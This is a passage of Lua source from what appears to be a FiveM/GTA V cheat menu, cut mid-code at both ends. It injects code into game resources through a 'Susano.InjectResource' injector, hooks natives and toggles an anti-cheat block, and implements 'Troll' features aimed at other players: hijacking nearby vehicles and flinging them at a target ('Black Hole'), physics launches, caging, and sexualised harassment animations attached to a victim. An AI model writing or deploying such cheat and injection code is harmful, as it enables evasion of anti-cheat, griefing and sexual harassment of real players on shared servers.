                hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetModelAsNoLongerNeeded", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameTimer", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityVelocity", function(originalFn, ...) return originalFn(...) end)
                
                if not _G.black_hole_active then
                    _G.black_hole_active = false
                end
                if not _G.black_hole_vehicles then
                    _G.black_hole_vehicles = {}
                end
                if not _G.black_hole_target_player then
                    _G.black_hole_target_player = nil
                end
                if not _G.black_hole_last_scan then
                    _G.black_hole_last_scan = 0
                end
                
                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end
                
                if not targetPlayerId then
                    return
                end
                
                    local playerPed = PlayerPedId()
                    local myCoords = GetEntityCoords(playerPed)
                    local myHeading = GetEntityHeading(playerPed)
                    
                    _G.black_hole_active = true
                    _G.black_hole_vehicles = {}
                    _G.black_hole_target_player = targetPlayerId
                    
                    local blackHoleCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
                    local camCoords = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    SetCamCoord(blackHoleCam, camCoords.x, camCoords.y, camCoords.z)
                    SetCamRot(blackHoleCam, camRot.x, camRot.y, camRot.z, 2)
                    SetCamFov(blackHoleCam, GetGameplayCamFov())
                    SetCamActive(blackHoleCam, true)
                    RenderScriptCams(true, false, 0, true, true)
                    
                    local playerModel = GetEntityModel(playerPed)
                    RequestModel(playerModel)
                    local timeout = 0
                    while not HasModelLoaded(playerModel) and timeout < 50 do
                        Wait(50)
                        timeout = timeout + 1
                    end
                    
                    local groundZ = myCoords.z
                    local rayHandle = StartShapeTestRay(myCoords.x, myCoords.y, myCoords.z + 2.0, myCoords.x, myCoords.y, myCoords.z - 100.0, 1, 0, 0)
                    local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
                    if hit then
                        groundZ = hitCoords.z
                    end
                    
                    local clonePed = CreatePed(4, playerModel, myCoords.x, myCoords.y, groundZ, myHeading, false, false)
                    SetEntityCollision(clonePed, false, false)
                    FreezeEntityPosition(clonePed, true)
                    SetEntityInvincible(clonePed, true)
                    SetBlockingOfNonTemporaryEvents(clonePed, true)
                    SetPedCanRagdoll(clonePed, false)
                    ClonePedToTarget(playerPed, clonePed)
                    
                    SetEntityVisible(playerPed, false, false)
                    
                    local emptyVehicles = {}
                    local searchRadius = 1000.0
                    local vehHandle, veh = FindFirstVehicle()
                    local success
                    
                    repeat
                        local vehCoords = GetEntityCoords(veh)
                        local distance = #(myCoords - vehCoords)
                        local vehClass = GetVehicleClass(veh)
                        local driver = GetPedInVehicleSeat(veh, -1)
                        local isEmpty = (driver == 0 or not DoesEntityExist(driver))
                        
                        if distance <= searchRadius and veh ~= GetVehiclePedIsIn(playerPed, false) and vehClass ~= 8 and vehClass ~= 13 and isEmpty then
                            table.insert(emptyVehicles, {handle = veh, distance = distance})
                        end
                        
                        success, veh = FindNextVehicle(vehHandle)
                    until not success
                    
                    EndFindVehicle(vehHandle)
                    
                    if #emptyVehicles == 0 then
                        SetEntityVisible(playerPed, true, false)
                        SetCamActive(blackHoleCam, false)
                        RenderScriptCams(false, false, 0, true, true)
                        DestroyCam(blackHoleCam, true)
                        if DoesEntityExist(clonePed) then
                            DeleteEntity(clonePed)
                        end
                        SetModelAsNoLongerNeeded(playerModel)
                        _G.black_hole_active = false
                        return
                    end
                    
                    table.sort(emptyVehicles, function(a, b) return a.distance < b.distance end)
                    while #emptyVehicles > 6 do
                        table.remove(emptyVehicles)
                    end
                    
                    for i, vehData in ipairs(emptyVehicles) do
                        local veh = vehData.handle
                        if DoesEntityExist(veh) and _G.black_hole_active then
                            SetPedIntoVehicle(playerPed, veh, -1)
                            Wait(150)
                            
                            SetEntityAsMissionEntity(veh, true, true)
                            if NetworkGetEntityIsNetworked(veh) then
                                NetworkRequestControlOfEntity(veh)
                                local timeout = 0
                                while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                                    NetworkRequestControlOfEntity(veh)
                                    Wait(10)
                                    timeout = timeout + 1
                                end
                            end
                            
                            SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                            SetEntityHeading(playerPed, myHeading)
                            Wait(50)
                        end
                    end
                    
                    SetEntityVisible(playerPed, true, false)
                    SetCamActive(blackHoleCam, false)
                    RenderScriptCams(false, false, 0, true, true)
                    DestroyCam(blackHoleCam, true)
                    if DoesEntityExist(clonePed) then
                        DeleteEntity(clonePed)
                    end
                    SetModelAsNoLongerNeeded(playerModel)
                    
                    _G.black_hole_vehicles = emptyVehicles
                
                CreateThread(function()
                    while not _G.black_hole_vehicles or #_G.black_hole_vehicles == 0 do
                        if not _G.black_hole_active then
                            return
                        end
                        Wait(100)
                    end
                    
                    while true do
                        Wait(100)
                        
                        if not _G.black_hole_active then
                            break
                        end
                        
                        local targetPlayerId = _G.black_hole_target_player
                        if not targetPlayerId then
                            _G.black_hole_active = false
                            break
                        end
                        
                        local targetPed = GetPlayerPed(targetPlayerId)
                        if not DoesEntityExist(targetPed) then
                            _G.black_hole_active = false
                            break
                        end
                        
                        local currentTargetCoords
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        
                        if targetVehicle and targetVehicle ~= 0 and DoesEntityExist(targetVehicle) then
                            currentTargetCoords = GetEntityCoords(targetVehicle)
                        else
                            currentTargetCoords = GetEntityCoords(targetPed)
                        end
                        
                        local vehicles = _G.black_hole_vehicles or {}
                        
                        local currentTime = GetGameTimer()
                        if not _G.black_hole_last_scan or (currentTime - _G.black_hole_last_scan) > 2000 then
                            _G.black_hole_last_scan = currentTime
                            
                            local searchRadius = 1000.0
                            local vehHandle, veh = FindFirstVehicle()
                            local success
                            local existingVehicleHandles = {}
                            
                            for _, vehData in ipairs(vehicles) do
                                if DoesEntityExist(vehData.handle) then
                                    existingVehicleHandles[vehData.handle] = true
                                end
                            end
                            
                            repeat
                                if DoesEntityExist(veh) then
                                    local vehCoords = GetEntityCoords(veh)
                                    local distance = #(currentTargetCoords - vehCoords)
                                    local vehClass = GetVehicleClass(veh)
                                    local driver = GetPedInVehicleSeat(veh, -1)
                                    local isEmpty = (driver == 0 or not DoesEntityExist(driver))
                                    
                                    if not existingVehicleHandles[veh] and distance <= searchRadius and veh ~= targetVehicle and vehClass ~= 8 and vehClass ~= 13 and isEmpty then
                                        table.insert(vehicles, {handle = veh, distance = distance})
                                        existingVehicleHandles[veh] = true
                                    end
                                end
                                
                                success, veh = FindNextVehicle(vehHandle)
                            until not success
                            
                            EndFindVehicle(vehHandle)
                            
                            _G.black_hole_vehicles = vehicles
                        end
                        
                        for _, vehData in ipairs(vehicles) do
                            local veh = vehData.handle
                            if DoesEntityExist(veh) then
                                if veh ~= targetVehicle then
                                    local vehCoords = GetEntityCoords(veh)
                                    local directionX = currentTargetCoords.x - vehCoords.x
                                    local directionY = currentTargetCoords.y - vehCoords.y
                                    local directionZ = currentTargetCoords.z - vehCoords.z
                                    
                                    local distance = math.sqrt(directionX * directionX + directionY * directionY + directionZ * directionZ)
                                    
                                    if distance > 2.0 then
                                        local normX = directionX / distance
                                        local normY = directionY / distance
                                        local normZ = directionZ / distance
                                        
                                        local attractionForce = math.min(50.0, 1000.0 / math.max(distance, 1.0))
                                        
                                        SetEntityVelocity(veh, normX * attractionForce, normY * attractionForce, normZ * attractionForce)
                                    else
                                        SetEntityVelocity(veh, 0.0, 0.0, 0.0)
                                    end
                                end
                            end
                        end
                    end
                end)
        ]], targetServerId))
    end
end

Actions.copyAppearanceItem = FindItem("Online", "Troll", "Copy Appearance")
if Actions.copyAppearanceItem then
    Actions.copyAppearanceItem.onClick = function()
        Menu.ActionCopyAppearance()
    end
end

Actions.banPlayerItem = FindItem("Online", "Troll", "Ban Player (test)")
if Actions.banPlayerItem then
    Actions.banPlayerItem.onClick = function(value)
        banPlayerActive = value
        if value then
            if banPlayerThread then
                return
            end
            banPlayerThread = CreateThread(function()
                local originalCoords = nil
                local teleported = false
                while banPlayerActive do
                    local targetServerId = Menu.SelectedPlayer
                    if not targetServerId then
                        Wait(1000)
                    else
                        local clientId = GetPlayerFromServerId(targetServerId)
                        if clientId and clientId ~= -1 then
                            local targetPed = GetPlayerPed(clientId)
                            if targetPed and DoesEntityExist(targetPed) then
                                local myPed = PlayerPedId()
                                if myPed then
                                    local myCoords = GetEntityCoords(myPed)
                                    local targetCoords = GetEntityCoords(targetPed)
                                    if myCoords and targetCoords then
                                        local distance = #(myCoords - targetCoords)
                                        
                                        if distance > 10.0 and not originalCoords then
                                            originalCoords = myCoords
                                            local angle = math.random() * 2 * math.pi
                                            local radiusOffset = math.random(5, 9)
                                            local xOffset = math.cos(angle) * radiusOffset
                                            local yOffset = math.sin(angle) * radiusOffset
                                            local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
                                            SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                                            SetEntityVisible(myPed, false, 0)
                                            teleported = true
                                            Wait(100)
                                        end
                                        
                                        local curTargetCoords = GetEntityCoords(targetPed)
                                        if curTargetCoords then
                                            ClearPedTasksImmediately(myPed)
                                            SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
                                            Wait(100)
                                            AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
                                            Wait(100)
                                            DetachEntity(myPed, true, true)
                                            Wait(200)
                                        end
                                    end
                                end
                            end
                        end
                    end
                    Wait(200)
                end
                
                local myPed = PlayerPedId()
                if myPed then
                    ClearPedTasksImmediately(myPed)
                    if originalCoords then
                        SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z + 1.0, false, false, false, false)
                        Wait(100)
                        SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
                    end
                    if teleported then
                        SetEntityVisible(myPed, true, 0)
                    end
                end
                banPlayerThread = nil
            end)
        else
            banPlayerActive = false
        end
    end
end

Actions.shootPlayerItem = FindItem("Online", "Troll", "Shoot Player")
if Actions.shootPlayerItem then
    Actions.shootPlayerItem.onClick = function()
        _Stealth.blockAC = true
        Menu.ActionShootPlayer()
        Citizen.SetTimeout(3000, function()
            if _Stealth._acUsers <= 0 then _Stealth.blockAC = false end
        end)
    end
end


Actions.launchAllItem = FindItem("Online", "all", "Launch All")
if Actions.launchAllItem then
    Actions.launchAllItem.onClick = function()
        Menu.ActionLaunchAll()
    end
end


                    Actions.blackHoleItem = FindItem("Online", "Troll", "Black Hole")
                    if Actions.blackHoleItem then
                        Actions.blackHoleItem.onClick = function(value)
                            if value then
                                Menu.ActionBlackHole()
                            else
                                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                    Susano.InjectResource("any", [[
                                        _G.black_hole_active = false
                                        _G.black_hole_vehicles = {}
                                        _G.black_hole_target_player = nil
                                        _G.black_hole_last_scan = 0
                                    ]])
                                else
                                    rawset(_G, 'black_hole_active', false)
                                    rawset(_G, 'black_hole_vehicles', {})
                                    rawset(_G, 'black_hole_target_player', nil)
                                    rawset(_G, 'black_hole_last_scan', 0)
                                end
                            end
                        end
                    end

                    Actions.twerkOnThemItem = FindItem("Online", "Troll", "twerk")
                    if Actions.twerkOnThemItem then
                        Actions.twerkOnThemItem.onClick = function(value)
                            if not Menu.SelectedPlayer then
                                Actions.twerkOnThemItem.value = false
                                return
                            end
                            
                            local targetServerId = Menu.SelectedPlayer
                            
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    local targetServerId = %d
                                    local playerPed = PlayerPedId()
                                    
                                    local targetPlayerId = nil
                                    for _, player in ipairs(GetActivePlayers()) do
                                        if GetPlayerServerId(player) == targetServerId then
                                            targetPlayerId = player
                                            break
                                        end
                                    end
                                    
                                    if not targetPlayerId then return end
                                    
                                    local targetPed = GetPlayerPed(targetPlayerId)
                                    if not DoesEntityExist(targetPed) then return end

                                    if rawget(_G, 'twerk_active') then
                                        ClearPedSecondaryTask(playerPed)
                                        DetachEntity(playerPed, true, false)
                                        rawset(_G, 'twerk_active', false)
                                    else
                                        rawset(_G, 'twerk_active', true)
                                        if not HasAnimDictLoaded("switch@trevor@mocks_lapdance") then
                                            RequestAnimDict("switch@trevor@mocks_lapdance")
                                            while not HasAnimDictLoaded("switch@trevor@mocks_lapdance") do
                                                Wait(0)
                                            end        
                                        end

                                        AttachEntityToEntity(playerPed, targetPed, 4103, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                        TaskPlayAnim(playerPed, "switch@trevor@mocks_lapdance", "001443_01_trvs_28_idle_stripper", 8.0, -8.0, 100000, 33, 0, false, false, false)
                                    end
                                ]], targetServerId))
                            end
                        end
                    end

                    Actions.backshotsItem = FindItem("Online", "Troll", "baise le")
                    if Actions.backshotsItem then
                        Actions.backshotsItem.onClick = function(value)
                            if not Menu.SelectedPlayer then
                                Actions.backshotsItem.value = false
                                return
                            end
                            
                            local targetServerId = Menu.SelectedPlayer
                            
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    local targetServerId = %d
                                    local playerPed = PlayerPedId()
                                    
                                    local targetPlayerId = nil
                                    for _, player in ipairs(GetActivePlayers()) do
                                        if GetPlayerServerId(player) == targetServerId then
                                            targetPlayerId = player
                                            break
                                        end
                                    end
                                    
                                    if not targetPlayerId then return end
                                    
                                    local targetPed = GetPlayerPed(targetPlayerId)
                                    if not DoesEntityExist(targetPed) then return end

                                    if rawget(_G, 'backshots_active') then
                                        ClearPedSecondaryTask(playerPed)
                                        DetachEntity(playerPed, true, false)
                                        rawset(_G, 'backshots_active', false)
                                    else
                                        rawset(_G, 'backshots_active', true)
                                        if not HasAnimDictLoaded("rcmpaparazzo_2") then
                                            RequestAnimDict("rcmpaparazzo_2")
                                            while not HasAnimDictLoaded("rcmpaparazzo_2") do
                                                Wait(0)
                                            end
                                        end

                                        AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.04, -0.4, 0.1, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                        TaskPlayAnim(PlayerPedId(), "rcmpaparazzo_2", "shag_loop_a", 8.0, -8.0, 100000, 33, 0, false, false, false)
                                    end
                                ]], targetServerId))
                            end
                        end
                    end

                    Actions.wankOnThemItem = FindItem("Online", "Troll", "branlette")
                    if Actions.wankOnThemItem then
                        Actions.wankOnThemItem.onClick = function(value)
                            if value then
                                if not Menu.SelectedPlayer then
                                    Actions.wankOnThemItem.value = false
                                    return
                                end
                                
                                local targetServerId = Menu.SelectedPlayer
                                
                                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                    Susano.InjectResource("any", string.format([[
                                        local targetServerId = %d
                                        local playerPed = PlayerPedId()
                                        
                                        local targetPlayerId = nil
                                        for _, player in ipairs(GetActivePlayers()) do
                                            if GetPlayerServerId(player) == targetServerId then
                                                targetPlayerId = player
                                                break
                                            end
                                        end
                                        
                                        if not targetPlayerId then return end
                                        
                                        local targetPed = GetPlayerPed(targetPlayerId)
                                        if not DoesEntityExist(targetPed) then return end

                                        rawset(_G, 'wank_active', true)
                                        rawset(_G, 'wank_target_ped', targetPed)
                                        
                                        if not HasAnimDictLoaded("mp_player_int_upperwank") then
                                            RequestAnimDict("mp_player_int_upperwank")
                                            while not HasAnimDictLoaded("mp_player_int_upperwank") do
                                                Wait(0)
                                            end
                                        end

                                        AttachEntityToEntity(playerPed, targetPed, 4103, 0.0, -0.3, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                        TaskPlayAnim(playerPed, "mp_player_int_upperwank", "mp_player_int_wank_01", 8.0, -8.0, 100000, 51, 1.0, false, false, false)
                                        
                                        CreateThread(function()
                                            while rawget(_G, 'wank_active') do
                                                Wait(0)
                                                
                                                local myPed = playerPed
                                                local targetPed = rawget(_G, 'wank_target_ped')
                                                
                                                if not DoesEntityExist(myPed) or not DoesEntityExist(targetPed) then
                                                    rawset(_G, 'wank_active', false)
                                                    rawset(_G, 'wank_target_ped', nil)
                                                    break
                                                end
                                                
                                                if not IsEntityAttachedToEntity(myPed, targetPed) then
                                                    AttachEntityToEntity(myPed, targetPed, 4103, 0.0, -0.3, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                                end
                                                
                                                if not IsEntityPlayingAnim(myPed, "mp_player_int_upperwank", "mp_player_int_wank_01", 3) then
                                                    TaskPlayAnim(myPed, "mp_player_int_upperwank", "mp_player_int_wank_01", 8.0, -8.0, 100000, 51, 1.0, false, false, false)
                                                end
                                            end
                                            
                                            if DoesEntityExist(playerPed) then
                                                if IsEntityAttached(playerPed) then
                                                    DetachEntity(playerPed, true, false)
                                                end
                                                ClearPedTasksImmediately(playerPed)
                                            end
                                        end)
                                    ]], targetServerId))
                                end
                            else
                                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                    Susano.InjectResource("any", [[
                                        rawset(_G, 'wank_active', false)
                                        rawset(_G, 'wank_target_ped', nil)
                                        
                                        local playerPed = PlayerPedId()
                                        if DoesEntityExist(playerPed) then
                                            if IsEntityAttached(playerPed) then
                                                DetachEntity(playerPed, true, false)
                                            end
                                            ClearPedTasksImmediately(playerPed)
                                        end
                                    ]])
                                end
                            end
                        end
                    end

                    Actions.piggybackItem = FindItem("Online", "Troll", "piggyback")
                    if Actions.piggybackItem then
                        Actions.piggybackItem.onClick = function(value)
                            if not Menu.SelectedPlayer then
                                Actions.piggybackItem.value = false
                                return
                            end
                            
                            local targetServerId = Menu.SelectedPlayer
                            
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    local targetServerId = %d
                                    local playerPed = PlayerPedId()
                                    
                                    local targetPlayerId = nil
                                    for _, player in ipairs(GetActivePlayers()) do
                                        if GetPlayerServerId(player) == targetServerId then
                                            targetPlayerId = player
                                            break
                                        end
                                    end
                                    
                                    if not targetPlayerId then return end
                                    
                                    local targetPed = GetPlayerPed(targetPlayerId)
                                    if not DoesEntityExist(targetPed) then return end

                                    if rawget(_G, 'piggyback_active') then
                                        ClearPedSecondaryTask(playerPed)
                                        DetachEntity(playerPed, true, false)
                                        rawset(_G, 'piggyback_active', false)
                                    else
                                        rawset(_G, 'piggyback_active', true)
                                        if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
                                            RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
                                            while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                                                Wait(0)
                                            end
                                        end

                                        AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false, false, false, false, 2, false)
                                        TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
                                    end
                                ]], targetServerId))
                            end
                        end
                    end


Menu.BugPlayerMode = "Bug"

function Menu.ActionBugPlayer()
    if not Menu.SelectedPlayer then return end
    
    local bugPlayerMode = Menu.BugPlayerMode or "Bug"
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d
            local bugPlayerMode = string.lower("%s")
            
            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end
            
            if not targetPlayerId then return end
            
            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then return end
            
            if bugPlayerMode == "bug" then
                CreateThread(function()
                    local playerPed = PlayerPedId()
                    local myCoords = GetEntityCoords(playerPed)
                    local myHeading = GetEntityHeading(playerPed)
                    
                    local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
                    if not closestVeh or closestVeh == 0 then return end
                    
                    SetPedIntoVehicle(playerPed, closestVeh, -1)
                    Wait(150)
                    
                    SetEntityAsMissionEntity(closestVeh, true, true)
                    if NetworkGetEntityIsNetworked(closestVeh) then
                        NetworkRequestControlOfEntity(closestVeh)
                    end
                    
                    SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                    Wait(100)
                    
                    for i = 1, 30 do
                        DetachEntity(closestVeh, true, true)
                        Wait(5)
                        AttachEntityToEntityPhysically(closestVeh, targetPed, 0, 0, 0, 1800.0, 1600.0, 1200.0, 300.0, 300.0, 300.0, true, true, true, false, 0)
                        Wait(5)
                    end
                end)
            elseif bugPlayerMode == "launch" then
                CreateThread(function()
                    local clientId = GetPlayerFromServerId(targetServerId)
                    if not clientId or clientId == -1 then
                        return
                    end
                    
                    local targetPed = GetPlayerPed(clientId)
                    if not targetPed or not DoesEntityExist(targetPed) then
                        return
                    end
                    
                    local myPed = PlayerPedId()
                    if not myPed then
                        return
                    end
                    
                    local myCoords = GetEntityCoords(myPed)
                    local targetCoords = GetEntityCoords(targetPed)
                    if not myCoords or not targetCoords then
                        return
                    end
                    
                    local distance = #(myCoords - targetCoords)
                    local teleported = false
                    local originalCoords = nil
                    
                    if distance > 10.0 then
                        originalCoords = myCoords
                        local angle = math.random() * 2 * math.pi
                        local radiusOffset = math.random(5, 9)
                        local xOffset = math.cos(angle) * radiusOffset
                        local yOffset = math.sin(angle) * radiusOffset
                        local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
                        SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                        SetEntityVisible(myPed, false, 0)
                        teleported = true
                        Wait(100)
                    end
                    
                    ClearPedTasksImmediately(myPed)
                    for i = 1, 5 do
                        if not DoesEntityExist(targetPed) then
                            break
                        end
                        
                        local curTargetCoords = GetEntityCoords(targetPed)
                        if not curTargetCoords then
                            break
                        end
                        
                        SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
                        Wait(100)
                        AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
                        Wait(100)
                        DetachEntity(myPed, true, true)
                        Wait(200)
                    end
                    
                    Wait(500)
                    ClearPedTasksImmediately(myPed)
                    
                    if originalCoords then
                        SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z + 1.0, false, false, false, false)
                        Wait(100)
                        SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
                    end
                    
                    if teleported then
                        SetEntityVisible(myPed, true, 0)
                    end
                end)
            elseif bugPlayerMode == "hard launch" then
                CreateThread(function()
                    local clientId = GetPlayerFromServerId(targetServerId)
                    if not clientId or clientId == -1 then
                        return
                    end
                    
                    local targetPed = GetPlayerPed(clientId)
                    if not targetPed or not DoesEntityExist(targetPed) then
                        return
                    end
                    
                    local myPed = PlayerPedId()
                    if not myPed then
                        return
                    end
                    
                    local myCoords = GetEntityCoords(myPed)
                    local targetCoords = GetEntityCoords(targetPed)
                    if not myCoords or not targetCoords then
                        return
                    end
                    
                    local distance = #(myCoords - targetCoords)
                    local teleported = false
                    local originalCoords = nil
                    
                    if distance > 10.0 then
                        originalCoords = myCoords
                        local angle = math.random() * 2 * math.pi
                        local radiusOffset = math.random(5, 9)
                        local xOffset = math.cos(angle) * radiusOffset
                        local yOffset = math.sin(angle) * radiusOffset
                        local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
                        SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                        SetEntityVisible(myPed, false, 0)
                        teleported = true
                        Wait(100)
                    end
                    
                    for cycle = 1, 4 do
                        ClearPedTasksImmediately(myPed)
                        for i = 1, 5 do
                            if not DoesEntityExist(targetPed) then
                                break
                            end
                            
                            local curTargetCoords = GetEntityCoords(targetPed)
                            if not curTargetCoords then
                                break
                            end
                            
                            SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
                            Wait(100)
                            AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
                            Wait(100)
                            DetachEntity(myPed, true, true)
                            Wait(200)
                        end
                        
                        if cycle < 4 then
                            Wait(1000)
                        end
                    end
                    
                    Wait(500)
                    ClearPedTasksImmediately(myPed)
                    
                    if originalCoords then
                        SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z + 1.0, false, false, false, false)
                        Wait(100)
                        SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
                    end
                    
                    if teleported then
                        SetEntityVisible(myPed, true, 0)
                    end
                end)
            elseif bugPlayerMode == "attach" then
                CreateThread(function()
                    local function reqCtrl(entity)
                        if not entity or entity == 0 then return false end
                        if not NetworkGetEntityIsNetworked(entity) then
                            NetworkRegisterEntityAsNetworked(entity)
                        end
                        if NetworkGetEntityIsNetworked(entity) then
                            NetworkRequestControlOfEntity(entity)
                            local attempts = 0
                            while not NetworkHasControlOfEntity(entity) and attempts < 30 do
                                Wait(10)
                                attempts = attempts + 1
                                NetworkRequestControlOfEntity(entity)
                            end
                            return NetworkHasControlOfEntity(entity)
                        end
                        return false
                    end

                    local targetPlayerId = nil
                    for _, player in ipairs(GetActivePlayers()) do
                        if GetPlayerServerId(player) == targetServerId then
                            targetPlayerId = player
                            break
                        end
                    end
                    if not targetPlayerId then return end

                    local targetPed = GetPlayerPed(targetPlayerId)
                    if not DoesEntityExist(targetPed) then return end

                    local playerPed = PlayerPedId()
                    local myCoords = GetEntityCoords(playerPed)
                    local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 120.0, 0, 70)
                    if not closestVeh or closestVeh == 0 then return end

                    SetEntityAsMissionEntity(closestVeh, true, true)
                    if not reqCtrl(closestVeh) then return end

                    SetPedIntoVehicle(playerPed, closestVeh, -1)
                    Wait(120)

                    SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                    Wait(50)

                    local targetVeh = GetVehiclePedIsIn(targetPed, false)
                    local targetEntity = targetVeh ~= 0 and DoesEntityExist(targetVeh) and targetVeh or targetPed
                    
                    AttachEntityToEntityPhysically(
                        closestVeh, targetEntity,
                        0, 0.0, 0.0, 0.0,
                        0.0, 0.0, 0.0,
                        0.0, 0.0, 0.0,
                        500.0, false, false, 1, 2
                    )
                    
                    Wait(100)
                    
                    AttachEntityToEntityPhysically(
                        closestVeh, targetEntity,
                        0, 0.0, 0.0, 0.0,
                        0.0, 0.0, 0.0,
                        0.0, 0.0, 0.0,
                        500.0, false, false, 1, 2
                    )
                end)
            end
        ]], targetServerId, bugPlayerMode))
    end
end

function Menu.ActionCagePlayer()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d
            
            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end
            
            if not targetPlayerId then return end
            
            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then return end
            
            CreateThread(function()
                local playerPed = PlayerPedId()
                local myCoords = GetEntityCoords(playerPed)
                local myHeading = GetEntityHeading(playerPed)
                
                local vehicles = {}
                local searchRadius = 150.0
                local vehHandle, veh = FindFirstVehicle()
                local success
                
                repeat
                    local vehCoords = GetEntityCoords(veh)
                    local distance = #(myCoords - vehCoords)
                    local vehClass = GetVehicleClass(veh)
                    if distance <= searchRadius and veh ~= GetVehiclePedIsIn(playerPed, false) and vehClass ~= 8 and vehClass ~= 13 then
                        table.insert(vehicles, {handle = veh, distance = distance})
                    end
                    success, veh = FindNextVehicle(vehHandle)
                until not success
                
                EndFindVehicle(vehHandle)
                
                if #vehicles < 4 then return end
                
                table.sort(vehicles, function(a, b) return a.distance < b.distance end)
                local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle, vehicles[4].handle}
                
                local function takeControl(veh)
                    SetPedIntoVehicle(playerPed, veh, -1)
                    Wait(150)
                    SetEntityAsMissionEntity(veh, true, true)
                    if NetworkGetEntityIsNetworked(veh) then
                        NetworkRequestControlOfEntity(veh)
                    end
                    SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                    Wait(100)
                end
                
                for i = 1, 4 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        takeControl(selectedVehicles[i])
